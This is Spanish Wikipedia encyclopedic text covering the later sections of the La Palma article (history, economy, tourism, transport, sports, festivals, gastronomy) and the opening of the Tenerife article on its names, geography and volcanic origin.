Sin la amenaza pirata, la vida en La Palma prosiguió su rumbo de forma tranquila. De cada crisis económica sufrida, se levantaba la isla, no por poseer riquezas minerales sino por la fertilidad de su tierra. Tras el cultivo de la caña de azúcar y de la vid, se pasó a la producción de miel, tabaco y seda. Desde principios del siglo XVI había comenzado la plantación de moreras, convirtiéndose La Palma en un foco de producción de seda. En 1830 se introdujo desde México el cultivo de la cochinilla, un parásito de las tuneras del que se extraía carmín. Con el desarrollo de los tintes sintéticos en 1880, el cultivo de la cochinilla dejó de ser rentable. Para salir de esta crisis se introdujo el cultivo del plátano impulsado por Elder y Fyffes, dos compañías británicas en 1878.

Mientras tanto, el pueblo llano apenas se veía beneficiado con las riquezas que producía la isla. Todavía en el siglo XIX, la mayoría de los habitantes de la isla vivían en casas de madera con techos de paja, debido a los altos costes que suponía erguir casas en piedra. Uno de los principales problemas era la falta de bienes de consumo. Debido al monocultivo practicado en la isla, faltaban tierras donde cultivar grano para alimentar a la población. Desde el siglo XVI se tenía que importar el grano, pagándose por él precios muy altos. El párroco de La Palma pagó sus impuestos con millo, lo que impulsó a la población a hacer lo mismo. La Inquisición dictó un Anatema sobre toda la isla provocando que durante varios años no se practicara ningún entierro cristiano. La pobreza en el campo era tan grande, que en muchas familias "los desnutridos y mal vestidos" hombres y mujeres, como relató el misionero Juan de Medinilla en 1758 en una carta al obispo, debido a la falta de ropa debían acudir por turnos a la misa de los domingos y festivos.

Al producirse el levantamiento militar de 1936, que daría lugar a la Guerra Civil española, la isla de La Palma se resiste al golpe y mantiene la legalidad republicana entre los días 18 y 25 de julio, cuando llega a la ciudad de Santa Cruz de La Palma el cañonero Canalejas. Este periodo de tiempo será conocido como La semana roja.

El golpe militar fracasa en esta isla al ser interceptado por el jefe de telégrafos el mensaje dirigido por los golpistas al comandante militar Baltasar Gómez Navarro, que debía dirigir el golpe en La Palma. En esos momentos era Delegado del Gobierno en la isla Tomás Yanes Rodríguez, de Izquierda Republicana. Al llegar las noticias del golpe el Frente Popular declara la huelga general, y se forman las milicias populares pero la Delegación de Gobierno no autoriza la toma del cuartel militar y trata de evitar siempre que las organizaciones obreras tomen demasiado poder (en estos momentos destaca la figura del comunista José Miguel Pérez, y en algunos municipios como Tazacorte las organizaciones comunistas tienen una gran importancia). A la llegada del cañonero Canalejas la Delegación del Gobierno decide no ofrecer ningún tipo de resistencia armada y ordena desmovilizar a las milicias populares confiando en que el Gobierno de la República mande refuerzos, que el golpe fracase y que la legalidad se restablezca en toda la nación.

La Guerra Civil no se libró en las Canarias, pero pese a ello sí se sufrieron las consecuencias de la misma. El periodo de la posguerra unido a la crisis económica producida trajo años de penurias a la isla. Debido a la carencia de bienes de importación, los palmeros tuvieron que basar su alimentación en el plátano, generando una gran variedad de productos derivados del mismo como la harina de plátano. Una vez finalizada la posguerra La Palma fue desarrollando su economía e infraestructuras poco a poco. Se recuperaron las exportaciones del plátano y comenzó la construcción de carreteras y canales para transportar el agua de los riachuelos a los campos de cultivo. La obra más importante de la época fue la construcción de la carretera de la cumbre, que unía los municipios de Santa Cruz de La Palma y Los Llanos de Aridane a través de un túnel por debajo de las cumbres de la isla, acortando bastante la duración del recorrido unido a la puesta en funcionamiento del aeropuerto. Con la llegada de la democracia, la economía de la isla, fuertemente dependiente de la agricultura del plátano, se fue diversificando hacia otros sectores especialmente el turístico, que constituye hoy en día el principal motor de la economía canaria.

La Palma, como parte de la Comunidad Autónoma de Canarias, depende en función de las distintas competencias, del Gobierno de España, del Gobierno de Canarias y del Cabildo Insular de La Palma.

A cargo de Miguel Ángel Morcuende, esta institución es la encargada de representar al Gobierno de España en la isla y de gestionar todas aquellas competencias que no hayan sido transferidas al Gobierno de Canarias. La sede de la Dirección Insular se encuentra en la avenida marítima de Santa Cruz de La Palma.

Los cabildos, formados a partir de la Ley de Cabildos de 1912, son las formas gubernativas y administrativas propias de las Islas Canarias y cumplen dos funciones principalmente. Por una parte, prestan servicios y ejercen competencias propias de la Comunidad Autónoma y por otra, son la entidad local que gobierna la isla. En las elecciones de 2003 salió elegido como presidente José Luis Perestelo Rodríguez, de Coalición Canaria, agrupación que obtuvo el 49,7% de los votos, seguida del PSOE con un 22,6%, y del PP con un 21,6% de los votos.

El Diputado del Común es el Defensor del Pueblo en Canarias. Lo designa el Parlamento de Canarias para la defensa de los derechos y libertades constitucionales en el ámbito autonómico. Su sede se encuentra en la calle O'Daly de Santa Cruz de La Palma, contando con oficinas en cada isla. No es un órgano administrativo de La Palma pues ejerce sus funciones en el ámbito autonómico.

La isla de La Palma, es la quinta isla más poblada oficialmente del Archipiélago Canario y la séptima de España, tenía empadronados a fecha de 1 de enero de 2017 y según fuentes del INE un total de 81.350 habitantes censados, las otras islas del archipiélago que siguen a La Palma en población son La Gomera con 23,073 habitantes y El Hierro con 10,995 habitantes. Alrededor de un 25% de la población total de la isla de La Palma (20.043 habitantes) lo están en el municipio de Los Llanos de Aridane, y cerca del 40% (34,651 personas) en el Valle de Aridane. La Palma tiene la población muy concentrada en dos ciudades, Santa Cruz de La Palma (12.783 habitantes) y Los Llanos de Aridane (3.547 habitantes).

Al municipio de Los Llanos de Aridane le siguen en población Santa Cruz de La Palma (15.711), El Paso (7.457), Breña Alta (7.086) y Breña Baja (5.377) todos ellos con más de 5.000 habitantes. El municipio de Garafía es el que cuenta con menor población de toda la isla (1.607). Además, La Palma registra un nivel alto de población no censada, que el número de turistas que recibe anualmente y los crecientes fenómenos migratorios lo pone de manifiesto. Sin embargo, se estima que las cifras teóricas de población no reflejan la realidad, ya que gran parte de la población legal de la isla no reside realmente en la misma, estimándose que esta se reduce a unos 55.000 habitantes reales como mucho (incluyendo a turistas y residentes no censados). 

En los últimos años La Palma ha experimentado un notable estancamiento de la población. En el año 1990 un total de 82.131 habitantes estaban censados en la isla, cifra que aumentó hasta los 82.483 habitantes en el año 2000. Esos datos reflejan un incremento en 352 personas. Sin embargo, en el intervalo comprendido entre el año 2000 y 2010, la población aumentó en 4,841 hasta llegar a los 87.324 habitantes.

Como sucede en el resto del archipiélago y del país, la población mayoritaría de la isla de La Palma es mayoritariamente católica, si bien, existen también minorías de otras religiones como pequeñas comunidades musulmanas. La isla tiene dos arciprestazgos pertenecientes a la Diócesis de San Cristóbal de La Laguna: el de "Santa Cruz de La Palma" y el de "Los Llanos de Aridane".

La isla se encuentra bajo el patronazgo de la Virgen de las Nieves y San Miguel Arcángel. Festivo insular en la isla es el 5 de agosto, festividad de la Virgen de las Nieves.

Actualmente se cultivan en la isla unas tres mil hectáreas de plátanos, siendo la segunda isla de Canarias donde más se cultiva (tras Tenerife), además existen plantaciones de cítricos, aguacates, verduras, papas y uvas (destinadas a la elaboración de vino). El traslado del agua de las cumbres a las huertas se hace a través de una red de galerías filtrantes y canales. La ganadería es principalmente caprina, destinada a la obtención de leche y la elaboración de quesos. Una creciente fuente de ingresos es el turismo, que se concentra en las zonas de Los Cancajos y Puerto Naos.

Al contrario de la agricultura, las manufacturas y la industria tienen una presencia escasa en La Palma. En la isla existen algunos establecimientos que transforman los productos de la tierra en productos de consumo o en obras de arte. También, gracias al turismo, la industria de la construcción tiene una presencia cada vez mayor en la isla. Sólo existía una fábrica, la fábrica de puros de El Paso, con 300 trabajadores, que producía grandes cantidades de cigarros. El mercado principal es el alemán. También existen pequeños talleres de bordados y de sedas.

Las exportaciones principales de La Palma son las de productos agrícolas. Pese a ello, la balanza de importaciones y exportaciones sigue siendo negativa en la isla, es decir, se importa más de lo que se exporta. Entre los productos exportados se encuentra el plátano, naranjas, limones y productos agropecuarios. Las importaciones principales, generalmente de la España peninsular, son el petróleo, productos de consumo y productos mecánicos y eléctricos.

En 1890 existían más hoteles en La Palma que en la actualidad. A finales del siglo XIX y principios del siglo XX muchos ingleses convalecientes visitaban la isla en busca de curas. Unas décadas más tarde comenzó el turismo moderno, teniendo su cota más alta en los años 1960. En las décadas de los 70 y 80 se redujo el número de turistas, alejándose la isla del turismo de masas que se estaba desarrollando en la isla vecina de Tenerife. A finales de los años 1980, con la ampliación del aeropuerto comenzaron a llegar vuelos chárter procedentes de varias ciudades europeas.

Con una oferta de 7500 camas, en La Palma no se puede hablar de turismo de masas. Existen pocos hoteles grandes, puesto que normalmente los turistas alquilan apartamentos o casas. Los alemanes conforman el 80% de los visitantes de la isla. En la zona de Los Llanos de Aridane y El Paso existe una importante colonia de residentes alemanes que han escogido la isla como su lugar de residencia permanente.

Cerca del extremo sur de la isla hay un ‘cementerio’ submarino con 40 cruces de piedra erigidas sobre arena y roca. La inmersión a este lugar singular se conoce como Las Cruces de Malpique y es una de las más solicitadas de esta isla, declarada Reserva de la Biosfera por la Unesco. De corrientes ocasionalmente fuertes, excelente visibilidad, profundidad máxima de 25 metros y fácil acceso desde la costa.

Un soberbio ataque del pirata Jacques de Sores ocurrió en 1570 frente a las costas de Fuencaliente con la matanza de los mártires de Tazacorte, 40 monjes franciscanos portugueses y españoles que fueron arrojados por la borda de su buque. En homenaje a ellos, a 20 metros de profundidad, hoy yacen 40 cruces que reciben la visita regular de fotógrafos submarinos, amantes del buceo nocturno y submarinistas en general. La cercana Reserva Marina de La Palma propicia que el lugar cuente también con una biodiversidad marina notable.

No se puede establecer si La Palma seguirá siendo un lugar tranquilo con poco turismo o si sucumbirá al turismo de masas. Las Autoridades (tanto del cabildo como de los distintos ayuntamientos) y los grupos ecologistas, no se ponen de acuerdo sobre el número máximo de camas que podría soportar la isla. Algunos datos lo sitúan en 80 mil aunque los más moderados sólo estiman 20 mil. Aunque cada día se aprecia más la necesidad de evolucionar hacia un turismo sostenible y la mayoría de los turistas que visitan en la actualidad La Palma lo hacen buscando un destino diferenciado basado en pequeños hoteles (rurales) e infraestructuras de ocio integradas en el paisaje y respetuosas con el entorno, existen algunos proyectos urbanísticos y turísticos, promovidos por Ayuntamientos y Cabildo de la Isla, que amenazan seriamente la integridad de varios espacios naturales protegidos: Campos de golf de 18 hoyos y sus hoteles amenazan al Paisaje Protegido de Tamanca, un pinar de gran valor en Fuencaliente, el monteverde y una zona de especial protección de las aves (ZEPA) en La Pavona, etc. Desde mediados de los años 1990 visitan la isla unos 140 mil turistas cada año, de los cuales 100 mil son alemanes. La agricultura sigue siendo, sin embargo, la mayor fuente de riqueza de la isla. Las Playas de Los Cancajos y Puerto Naos ostentan la Bandera azul, lo que garantiza un alto nivel de calidad.

Desde hace algunos años, se ha implantado en la isla el denominado Turismo Rural. Esta modalidad turística consiste en la remodelación y modernización de casas antiguas para convertirlas en casas de huéspedes, respetando la arquitectura tanto interior como exterior. Este proyecto, inicialmente financiado por el proyecto LEADER de la Unión Europea, ayuda a preservar los paisajes de la isla pues sólo se pueden remodelar casas antiguas efectuando pequeñas ampliaciones. La primera entidad, constituida en 1992, para el impulso de este sector fue la Asociación de Turismo Rural Isla Bonita, que agrupa a los isleños propietarios de establecimientos.

Las carreteras de La Palma forman una red de 510,06 kilómetros. Todas las carreteras están asfaltadas y en buen estado, aunque prácticamente todas presentan muchas curvas, algunas muy cerradas. Para acceder a algunos caseríos del norte hay que transitar por pistas de tierra. Existe una carretera de circunvalación de la isla, de unos 157,88 Kilómetros. Estrictamente, esta circunvalación está compuesta por dos carreteras, la Carretera General del Norte (LP-1) y la Carretera general del Sur (LP-2) . La LP-1, circunvalación norte de 102,430 km parte de Santa Cruz de La Palma y termina en Argual, pasando por (o cerca de) Puntallana, Los Sauces, Barlovento, Garafía, Puntagorda y Tijarafe. La LP-2, circunvalación sur, de 55,450 km parte de Santa Cruz de la Palma y termina en el Puerto de Tazacorte, pasando por (o cerca de) Breña Baja, Mazo, Fuencaliente, Los Llanos y Tazacorte. La LP-3, de 25,9 km, también conocida como "Carretera de la cumbre", es una carretera de montaña que atraviesa la isla de este a oeste pasando por dos túneles excavados bajo Cumbre Nueva. Su origen está en la LP-2, a 3 km de Santa Cruz y finaliza en el cruce de Tajuya (El Paso). La LP-4, de 47,840 km, carretera del Roque, sube al observatorio astrofísico del Roque de los Muchachos, bajando hasta Hoya Grande (Garafía) por la vertiente norte de la isla. La LP-5, carretera del Aeropuerto, de 3,8 km parte del barrio del Fuerte (Breña Baja), y acaba en el Aeropuerto de La Palma. La LP-20, "vía exterior" de Santa Cruz de La Palma, es una circunvalación de 3,7 km que evita el paso por el casco urbano de la capital, posee 5 túneles que con sus 1831 m de longitud constituyen el 49% del total de la vía. La red insular se completa con 47 carreteras más, de carácter secundario. El origen de todas las carreteras, punto kilométrico cero de la isla, se fija en la rotonda de acceso al puerto de Santa Cruz (Glorieta de Blas Pérez González).

Existen varias líneas de guaguas que unen las principales localidades de la isla a distintas horas. Para conocer detalles actuales sobre el servicio se puede acceder a la página oficial de Transportes Insulares de La Palma. Disponen de guaguas adaptadas para personas con movilidad reducida, como elevadores para sillas de ruedas. También poseen trenes turísticos para visitar la isla.

La bahía de la capital ha sido usada como puerto desde la conquista de la isla en 1493. Actualmente, parten ferris desde Santa Cruz de La Palma hacia las demás islas, sobre todo a Tenerife, donde operan las compañías Naviera Armas, Acciona Trasmediterránea y Fred. Olsen Express, con tiempos y horarios variables según el barco y compañía, que van desde las 2 horas hasta las 5 horas. También hay una línea que une una vez por semana Santa Cruz de La Palma con Cádiz. 

El nuevo puerto de Tazacorte poseía una conexión semanal con Tenerife, vía Santa Cruz de La Palma. Por otra parte, el municipio de Los Llanos de Aridane, situado junto al anteriormente mencionado Tazacorte, posee una población costera llamada Puerto Naos que pese a que su nombre podría prestar a confusión, no tiene ningún puerto al uso.

En 1950 entró en servicio el Aeropuerto de Buenavista, el primer aeropuerto de La Palma, que estaba emplazado en Breña Alta. Sin embargo, debido a los problemas meteorológicos y a la imposibilidad de ampliarlo para dar cabida a los nuevos aviones de reacción, dejó de utilizarse en 1970 ya que entró en funcionamiento un nuevo aeropuerto en la costa de Mazo. El 24 de febrero de 1970 aterrizó el primer avión en el aeropuerto, un DC-3 del Ejército del Aire. En 1987 el Aeropuerto de La Palma pasó al sexto lugar del archipiélago en número de operaciones. Actualmente, Binter Canarias y Canaryfly realizan las conexiones aéreas con las demás islas. Iberia ofrece conexiones con la península y Transavia y otros operadores chárter y de bajo coste unen la isla con diversas ciudades europeas.

Debido a la localización de la isla y a la altura que alcanza sobre el nivel del mar, han sido instalados varios telescopios en el Observatorio del Roque de los Muchachos. La ubicación geográfica, en medio del Atlántico, y el peculiar clima provocan la formación de nubes entre los 1.000 y 2.000 m de altura, que hacen de espejo e impiden que la contaminación lumínica de las poblaciones de la costa dificulte la observación de las estrellas. Para evitar este hecho también, gran parte de las calles de los municipios de la isla han cambiado su alumbrado público de luz blanca por luz naranja, facilitando así una mejor visión.


El DOT y el SST han sido construidos para estudiar el Sol.

El baloncesto se viene practicando de forma masiva en los colegios de la isla y ha alcanzado gran popularidad, especialmente entre la población joven. Actualmente el máximo representante de la isla es el C.B. Aridane milita en ligas regionales. Además hay otros equipos que juegan en las ligas regionales y locales.

El fútbol es el deporte por excelencia de La Palma, siendo además el que posee un mayor número de seguidores. Los tres equipos locales con más aficionados son el Club Deportivo Mensajero, la Sociedad Deportiva Tenisca en Santa Cruz de La Palma y la Unión Deportiva Los Llanos de Aridane en el municipio del mismo nombre. En total hay 19 clubes federados. Estos equipos militan en las categorías regionales de Canarias poseyendo la federación tinerfeña de fútbol una sede en la capital de la isla.

La Transvulcania es una ultramaratón de montaña, se basa en un recorrido muy exigente de algo más de 73 km. de distancia y 8500 m de desnivel acumulado. Desde el 2012, puntúa para el Campeonato del Mundo de Carreras de Montaña.

En La Palma se practican numerosos juegos autóctonos. Algunos provienen de antiguos métodos de trabajo, como el Salto del Pastor, que la forma que tenían los pastores de descender desde las cumbres o el Calabazo, que era la forma de pasar agua de un canal a otro. Entre los deportes canarios practicados en la isla, cabe destacar los siguientes:

La lucha se desarrolla dentro de un círculo, generalmente de arena, denominado terrero. En él, dos luchadores se enfrentan agarrados intentando derribarse. El organismo de la isla que vela por este deporte es la Federación Insular de Lucha Canaria, y tiene su sede en Los Llanos de Aridane.

En La Palma existen 10 terreros distribuidos por nueve municipios:

La Palma posee varios clubes que participan en la Liga Regional del Gobierno de Canarias. Estos clubes son el "Bediesta" (de San Andrés y Sauces), el "Candelaria-Mirca" y "Tedote" (de Santa Cruz de la Palma), el "Balta" (de Breña Alta), el "San Blas" (de Mazo), el "San Antonio" (de Fuencaliente), el "Las Manchas" (de El Paso), el "Aridane" (de Los Llanos), el "Tazacorte" (de Tazacorte) y el "Candelaria-Tijarafe" (de Tijarafe).

El juego del palo canario es un arte marcial que se práctica entre dos jugadores que, sin llegar a hacer contacto con el cuerpo del adversario, realizan un combate con palos. El juego del palo, en su origen, no tenía carácter lúdico, sino que era un método de combate que algunos creen ya utilizado por los canarios pre coloniales. En la isla de La Palma, existen dos clubes miembros de la "Federación del Juego del Palo", el "Club Escuela-El Paso" y el "Club Grupo Galguén". Estos clubes participan en la Liga del Juego del Palo, en la que compiten equipos de La Palma, Tenerife, Lanzarote, Gran Canaria y Fuerteventura. Pese a carecer de clubes, se sigue manteniendo la tradición en forma de exhibiciones, especialmente en las fiestas religiosas. El Estilo Vidal es originario de Garafía.

Similar al juego francés de la petanca, la bola canaria se práctica poco en la actualidad a nivel regional aunque en la isla existen varios equipos y canchas. Básicamente consiste en sumar equipos mediante el lanzamiento de unas bolas que hay que dejar lo más cerca posible de un objeto llamado mingue o boliche. Se juega en un terreno rectangular de arena o tierra de entre 18 y 25 m de largo y un ancho de entre 3,5 y 6 m. En La Palma hay afición a este juego, participando activamente en las competiciones celebradas tanto a nivel insular como regional.

Las características geográficas de los fondos marinos de la isla, junto con la gran calidad de sus aguas, hacen de La Palma un lugar especial para la práctica del submarinismo. Los fondos volcánicos de la palma presentan barrancos y arcos de lava subterráneos. En algunas zonas, debido a la gran profundidad, se práctica la "apnea", logrando Audrey Mestre el récord de profundidad (125 metros) frente a las costas de Puerto Naos.

Además de los citados, en la isla se práctican otros deportes de los que la siguiente es una pequeña relación:





La celebración más destacada de La Palma tiene lugar en las denominadas Fiestas Lustrales de la Bajada de la Virgen de las Nieves (patrona de la isla) que cada cinco años (cuando los años acaban en "0" o "5") se desplaza, el segundo sábado de julio, desde el Real Santuario Insular hacia la capital de la isla hasta el día de su onomástica, el 5 de agosto. Durante estas celebraciones, aparte de la romería que acompaña a la patrona hasta Santa Cruz y viceversa, se hace representaciones de la conquista de la Isla, simulaciones de rituales Benahoaritas y la Danza de los Enanos, el acto más destacado de la fiesta, en la cual unos danzarines disfrazados de enanos con trajes decimonónicos desfilan por las calles de la capital practicando una danza característica. La otra representación importante es el baile del Minué, el que se imita una danza decimonónica.

El carnaval es otra de las fiestas que más se celebran. A pesar de contar con todos los elementos característicos de los carnavales canarios ("reina del carnaval", "comparsas", "murgas" etc.) el Carnaval palmero destaca por la celebración de los Indianos. Esta fiesta, que tiene lugar el lunes de carnaval, es una burla a los indianos, es decir, a los palmeros retornados de las Américas. Para la ocasión, todo el mundo se disfraza con trajes de encaje y guayaberas de blanco impoluto de la misma forma que regresaban los acaudalados emigrantes. Tras una representación en la que un barco de época llega al puerto lleno de indianos, con sus loros, sirvientas (conocidas como la "negra Tomasa") y demás elementos característicos, comienza una batalla campal de polvos de talco por las calles capitalinas al ritmo del son cubano.

También tiene gran tradición la celebración del Día de la Cruz el 3 de mayo en los pueblos de la comarca este de la isla, en la que se conmemora doblemente la fundación de la ciudad de Santa Cruz de la Palma, acaecida el 3 de mayo de 1492 y la festividad de la cruz, para lo cual se enraman y se visten con joyas numerosas cruces repartidas por cada pueblo y barrio, y es costumbre visitar las diferentes cruces en la noche del día anterior.

Además cada municipio de La Palma posee sus fiestas patronales, habiendo incluso fiestas independientes en algunos barrios, como es el caso de Argual, en el municipio de Los Llanos. 

El folclore palmero es similar al del resto de las Canarias, con la excepción del baile del sirinoque que es oriundo de la isla.

El Festivalito, nombre por el que es más conocido el Festival Internacional de Cine Chico de Canarias-Isla de La Palma, es un festival de cine digital que se celebra cada verano en La Palma, desde 2002. Fue el primer certamen internacional en incorporar los rodajes a su programación aprovechando las nuevas tecnologías.

El Festivalito, desde su primera edición, suma a los apartados habituales en los festivales cinematográficos tradicionales -secciones oficiales e informativas, retrospectivas, mesas redondas...- un concurso que retaba a los participantes a escribir, rodar y estrenar un cortometraje en el marco del festival aprovechando las virtudes de la tecnología digital y el espacio natural de la isla. Es la sección La Palma Rueda, por la que han pasado cineastas de los cinco continentes. Desde 2002, se han producido más de 120 cortometrajes con el sello de La Palma Rueda, además de dos largometrajes experimentales. Las obras deben inspirarse en un lema que se hace público en la gala inaugural, y se estrenan en la ceremonia de clausura del certamen

Los galardones del Festivalito, que se conceden tanto en los apartados de exhibición como en la sección La Palma Rueda, son las Estrellas del Festivalito, que cada año diseña un artista diferente inspirándose en el límpido firmamento de La Palma.

En los últimos años, la isla ha sido receptora de rodajes de algunas producciones de cine, documentales, capítulos de series, cortometrajes o planos concretos tanto en largometrajes u otros contenidos audiovisuales. Algunos de los rodajes más importantes realizados en la isla son:


La gastronomía palmera destaca por ser una de las más elaboradas del archipiélago, especialmente en lo que se refiere a sus postres, presentes en la mayoría de las islas, y a los mojos.

Se trata de un tipo de salsa tradicional de las islas Canarias, acompañamiento imprescindible de algunas comidas típicas del archipiélago. Debido a su contenido en pimienta, muchos de los tipos de mojos son picantes, entre ellos se encuentran el mojo de cilantro, de perejil, de pimentón, etc. No obstante el abanico de estas salsas es muy amplio y permite el uso de distintos ingredientes en su elaboración como almendras, queso, azafrán, pan frito, entre otras posibilidades. 

Tanto los pescados como las carnes suelen acompañarse con papas arrugadas. Es éste un plato típico del conjunto de Canarias que responde simplemente a la forma de cocinar las papas. Con agua, mucha sal, y sin pelar. En 2016 fueron proclamadas maravilla gastronómica de España en un concurso promovido por Allianz Global Assistance, consiguiendo el primer puesto mediante voto popular a través de internet.






</doc>
<doc id="6474" url="https://es.wikipedia.org/wiki?curid=6474" title="Tenerife">
Tenerife

Tenerife es una isla del océano Atlántico perteneciente a la Comunidad Autónoma de Canarias (España). Junto a La Palma, La Gomera y El Hierro conforma la provincia de Santa Cruz de Tenerife. Con una superficie de 2.034,38 km² y una población de 894.636 habitantes (2017) es la isla más extensa del Archipiélago Canario y la más poblada de España. Además, Tenerife es también la isla más extensa y poblada de la región Macaronesia.

La ciudad de Santa Cruz de Tenerife es la capital de la isla y de la provincia homónima, así como su municipio más poblado con 206.965 habitantes (INE 2012). La ciudad es además capital de la Comunidad Autónoma de Canarias, aunque compartiendo ese estatus con Las Palmas de Gran Canaria. A pesar de esto, entre 1833 y 1927 Santa Cruz de Tenerife fue oficialmente la única capital del Archipiélago Canario, hasta que en 1927 un decreto ordenó que la capitalidad de Canarias fuera compartida, que es como permanece actualmente. El segundo municipio por número de habitantes de la isla y tercero de Canarias con 152.222 habitantes es San Cristóbal de La Laguna, cuyo casco histórico es Patrimonio de la Humanidad. El área metropolitana de Santa Cruz de Tenerife tiene una población de más de 400.000 habitantes.

La isla posee otro lugar catalogado por la UNESCO como Patrimonio de la Humanidad, el Parque nacional del Teide, el cuál es el más visitado de España, así como uno de los más visitados del mundo. En él se encuentra la máxima elevación de España y tercer volcán más grande del mundo desde su base en el lecho oceánico, el Teide. Por su riqueza natural y etnográfica el Macizo de Anaga ha sido catalogado además como Reserva de la Biosfera también por la UNESCO el 9 de junio de 2015. Este es además el paraje natural que mayor cantidad de endemismos tiene de Europa.

De gran importancia es el Carnaval de Santa Cruz de Tenerife, declarado y considerado como uno de los de mayor relevancia a nivel mundial. Además la isla posee una variada arquitectura, destacando entre ella la colonial y la contemporánea, cuyo máximo exponente es el moderno edificio del Auditorio de Tenerife, situado en Santa Cruz de Tenerife. Tenerife también es conocido por ser un gran destino turístico en España y fuera de ella, recibiendo a más de cinco millones de turistas anualmente y siendo por lo tanto el principal destino turístico del Archipiélago Canario, así como uno de los más importantes de España y del mundo.

Son diversos los nombres que las distintas culturas han atribuido a Tenerife a lo largo de la historia. Así por ejemplo, para los nativos guanches la isla recibía el nombre de Achined, Achinet o Chenet, aunque en función de la bibliografía que se consulte, la nómina puede adquirir diferentes variaciones ortográficas. Según el historiador Ignacio Reyes la forma primitiva sería "(w)a-zenzen" con el valor de 'resonancia, zumbido, retumbo', mientras que Álvarez Delgado indica que "Achinech" −"at-ti-ney"− es «una expresión cariñosa o afectiva» que traduce como 'he aquí la mía' o 'la mía', 'mi tierra'.

Las descripciones romanas de las islas Afortunadas (especialmente Plinio el Viejo en su obra "Naturalis Historia") incluían una llamada Nivaria o Ninguaria (del latín "nix", "nivis", "nieve"), que se cree que hace referencia a las nieves posadas sobre el volcán tinerfeño conocido como el Teide.

Los mapas portulanos de los siglos XIV y XV suelen designar a la isla como "Insula del'inferno" (Isla del Infierno), probablemente debido a los procesos eruptivos de los que el volcán era protagonista.

Se cree que el nombre actual de la isla se debe al aspecto del Teide ya que fue dado por los benahoaritas (aborígenes de La Palma) según las palabras Tener ("blanca") e ife ("montaña"). La mención escrita más antigua conocida de Tenerife es en la forma Tenerefiz y data de alrededor de 1350, en una obra literaria titulada "Libro del Conoscimiento". Sin embargo, los historiadores dieciochescos Juan Núñez de la Peña y Tomás Arias Marín de Cubas, entre otros, supusieron que el nombre de la isla podría provenir del legendario mencey guanche Tinerfe apodado —"el Grande"—, quien gobernó toda la isla en tiempos anteriores a la conquista de Canarias por parte de Castilla.

Tenerife es una isla en gran parte muy abrupta, de relieve formado por sucesivas erupciones volcánicas a lo largo de la historia, la más reciente de las cuales fue la del Chinyero en 1909.

La isla está situada entre los paralelos 28º y 29º N y los meridianos 16º y 17º O, ligeramente al norte del trópico de Cáncer, ocupando una posición central entre Gran Canaria, La Gomera y La Palma. Se encuentra a algo más de 300 km del continente africano, y a unos 1.000 km de la península Ibérica.

De forma triangular, Tenerife es la mayor isla del archipiélago canario, con una superficie de 2.034,38 kilómetros cuadrados y la que más longitud de costas tiene con 342 kilómetros. Además, es la isla más alta de España y la : en su centro se alza el Pico del Teide, que con sus 3.718 msnm representa a su vez el punto más elevado de toda España, de las islas del océano Atlántico y el tercer volcán más grande del mundo desde su base en el lecho oceánico, solo superado en este sentido por el Mauna Kea y el Mauna Loa (ambos en las Islas Hawái). Tiene hasta 200 pequeños islotes o roques a su alrededor, entre los que destacan los de Anaga, Garachico, Fasnia que suman un total de 213.835 metros cuadrados más. Tenerife es también la isla más grande y poblada de la región Macaronesia.

Tenerife es una isla de origen volcánico, cuya formación comenzó a gestarse en el fondo oceánico hace unos 20-50 millones de años.

Según una de las teorías más aceptadas actualmente por la comunidad científica ("Teoría de los bloques levantados"), el ascenso de magma procedente del manto terrestre se produce en periodos de actividad tectónica a partir de fallas o fracturas que existen en el fondo oceánico. Estas siguen los ejes estructurales de la isla, y se conformaron durante la orogenia Alpina de la Era Terciaria por el movimiento de la placa Africana. Estas erupciones de tipo fisural submarino originan las denominadas lavas almohadilladas o pillow-lavas, que se producen por el rápido enfriamiento que experimenta el magma al establecer contacto con el agua, obteniendo así una forma muy característica. Estos materiales se fueron acumulando y construyendo el edificio insular bajo el mar. A medida que este se aproximaba a la superficie, los gases, debido a la disminución de la presión circundante, se iban liberando del magma y los episodios vulcanológicos pasaban de ser tranquilos a tener un carácter marcadamente explosivo, formando materiales fragmentarios.

Tras largo tiempo de acumulación de materiales, el nacimiento de la isla se produjo a finales del Mioceno (Era Terciaria). Hace siete millones de años emergieron las zonas de Teno, Anaga y Macizo de Adeje, en la que se denomina "Serie Basáltica Antigua" o "Serie I". Se constituyeron de este modo tres islas cronológica y estratigráficamente distintas en los extremos oeste, este y sur de la actual Tenerife.

Hace aproximadamente 3 m a. comienza un segundo ciclo volcánico ("Formaciones Postmiocenas" o "Series Recientes II, III y IV"), mucho más intenso, que incorpora elementos en la zona central de la isla, la cual también emerge y unifica en uno solo a los tres edificios anteriormente descritos. La estructura conformada en ese momento recibe el nombre de "Edificio pre-Cañadas", sobre cuyos restos se erigiría más tarde el "Edificio Cañadas I". Este ultimó experimentó diversos colapsos y emitió una gran variedad de materiales explosivos que dieron lugar a las llamadas "Bandas del sur" (sur-sureste actual).

Posteriormente, sobre las ruinas de este complejo surgiría el "Edificio Cañadas II", ya por encima de los 2.500 metros, también con intensos procesos explosivos. Hace alrededor de 1 m a. se inició la construcción de la "Cordillera Dorsal", con un vulcanismo de tipo fisural, a partir de los restos de los edificios ya parcialmente desmantelados de la "Serie I". La "Cordillera Dorsal" es la de mayor desarrollo altitudinal y longitudinal del Archipiélago Canario, con 1.600 metros de altura y 25 kilómetros de longitud. En este mismo espacio cronológico (hace 800.000 años) tienen lugar dos deslizamientos gravitacionales que motivaron la aparición de los valles de La Orotava y Güímar.

Finalmente, ya en tiempos más próximos (200.000 años), comienzan las erupciones que levantarían el "Edificio Pico Viejo-Teide" en el centro de la isla, sobre la "Caldera de Las Cañadas".

La abrupta orografía isleña y su variedad de climas dan como resultado un territorio de múltiples paisajes y formas, desde el Parque nacional del Teide con su amalgama de colores fruto de las sucesivas erupciones volcánicas, hasta los Acantilados de Los Gigantes con sus paredes verticales, pasando por zonas semidesérticas con plantas resistentes a la sequedad en el sur, o por ambientes de carácter meramente volcánico como es el Malpaís de Güímar o el Malpaís de La Rasca.

También cuenta con playas naturales como la de El Médano (con parajes protegidos en su entorno como Montaña Roja y Montaña Pelada) valles con cultivos tropicales y subtropicales, boscosos parajes de laurisilva en los macizos de Anaga y Teno (con profundos y escarpados barrancos) y extensos bosques de pinos por encima de esta última formación vegetal.

